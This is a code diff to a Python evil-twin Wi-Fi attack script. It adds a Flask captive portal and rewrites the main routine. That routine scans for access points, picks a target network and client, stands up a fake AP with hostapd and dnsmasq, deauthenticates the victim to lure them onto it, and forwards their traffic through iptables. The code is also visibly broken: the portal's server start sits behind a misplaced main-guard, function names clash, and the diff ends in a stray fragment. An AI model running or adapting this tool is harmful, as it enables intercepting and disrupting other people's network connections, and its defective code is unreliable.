@@ -148,6 +148,36 @@ def reset_setting():
     os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
     os.system('systemctl start systemd-resolved >/dev/null 2>&1')
 
+def run_captive_portal():
+    from flask import Flask, request, render_template
+
+    app = Flask(__name__)
+
+    # Replace these with your actual credentials and valid users
+    VALID_USERS = {
+        "admin": "password"
+    }
+
+    @app.route("/", methods=["GET", "POST"])
+    def login():
+        if request.method == "POST":
+            username = request.form.get("username")
+            password = request.form.get("password")
+
+            if authenticate_user(username, password):
+                # Redirect to success page or the internet
+                return render_template("success.html", username=username)
+            else:
+                return render_template("login.html", error="Invalid credentials. Please try again.")
+
+        return render_template("login.html", error="")
+
+    def authenticate_user(username, password):
+        return username in VALID_USERS and VALID_USERS[username] == password
+
+    if __name__ == "__main__":
+        app.run(host="0.0.0.0", port=80)
+
 
 # for  monitoring the access point available  
 def Wifi_scaning():
@@ -263,47 +293,92 @@ def create_conf_file(iface, ssid):
 
 
 def main():
-    global iface ,ap_mac
-    iface = input("please enter the first interface name: ") #for sniffing users
-    iface2= input("Please enter the second interface name: ") #for creating fake AP 
-    #step 1: Change the first interface to monitor mode:
-    iface = start_monitor_mode()
+    global iface, ap_mac
+    iface = input("Please enter the first interface name: ")  # for sniffing users
+    iface2 = input("Please enter the second interface name: ")  # for creating fake AP
+
+    # Step 1: Change the first interface to monitor mode
+    iface = start_monitor_mode(iface)
+
     print("Evil twin attack started")
-    gateway() #inorder to assign gateway to the interface
-    Wifi_scaning() 
+    gateway()  # In order to assign a gateway to the interface
+    Wifi_scaning()
+
     # Choose access point to attack
-    if len(ap_list) > 0 : 
-        mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
+    if len(ap_list) > 0:
+        mac_adder = int(input("\nEnter the index of the SSID you want to attack: ")) - 1
         ap_mac = ap_list[mac_adder]
         ssid_name = ssid_list[mac_adder]
-        # for creating the fake AP we need 2 '.conf' files
-        create_conf_file(iface2 , ssid_name)
+        # For creating the fake AP, we need to create a configuration file
+        set_hostapd(iface2, ssid_name)
+        set_dnsmasq(iface2)
         Users_scaning()
-    #Choose user to attack
-    if len(users_list) > 0 :
-        user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
-        user_mac = users_list[user_adder]
-    
-    # then we need to carry out disconnection attack in order to overpower our ap
-    
-    disconnection(user_mac ,ap_mac , iface)
-    
-    #once the user is connected to the fake ap  we need to provide the user with internet acess 
-    #so we need to forward trafic form eth0
-    set_iptables()
-    
-    # in order to host the captive portal website
-    
-    
-    edit_apacherules()
-    start_apacherules()
-    
-    
-# after all the work
-stop_monitor_mode()
-reset_settings()
 
-     main()
+    # Choose user to attack
+    if len(users_list) > 0:
+        user_adder = int(input("\nEnter the index of the client you want to attack: ")) - 1
+        user_mac = users_list[user_adder]
+
+    # Then we need to carry out the deauthentication attack to overpower the legitimate AP
+    disconnection(user_mac, ap_mac, iface)
+
+    # Once the user is connected to the fake AP, we need to provide the user with internet access
+    set_iptables()
+
+    # In order to host the captive portal website, run the Flask captive portal server
+    start_apache()
+    run_captive_portal()
+
+    # After all the work, stop monitor mode and reset network settings
+    stop_monitor_mode(iface)
+    reset_settings()
+
+if __name__ == "__main__":
+    main()
+
+
+# def main():
+#     global iface ,ap_mac
+#     iface = input("please enter the first interface name: ") #for sniffing users
+#     iface2= input("Please enter the second interface name: ") #for creating fake AP 
+#     #step 1: Change the first interface to monitor mode:
+#     iface = start_monitor_mode()
+#     print("Evil twin attack started")
+#     gateway() #inorder to assign gateway to the interface
+#     Wifi_scaning() 
+#     # Choose access point to attack
+#     if len(ap_list) > 0 : 
+#         mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
+#         ap_mac = ap_list[mac_adder]
+#         ssid_name = ssid_list[mac_adder]
+#         # for creating the fake AP we need 2 '.conf' files
+#         create_conf_file(iface2 , ssid_name)
+#         Users_scaning()
+#     #Choose user to attack
+#     if len(users_list) > 0 :
+#         user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
+#         user_mac = users_list[user_adder]
+    
+#     # then we need to carry out disconnection attack in order to overpower our ap
+    
+#     disconnection(user_mac ,ap_mac , iface)
+    
+#     #once the user is connected to the fake ap  we need to provide the user with internet acess 
+#     #so we need to forward trafic form eth0
+#     set_iptables()
+    
+#     # in order to host the captive portal website
+    
+    
+#     edit_apacherules()
+#     start_apacherules()
+    
+    
+# # after all the work
+# stop_monitor_mode()
+# reset_settings()
+
+     ma
 
 
 
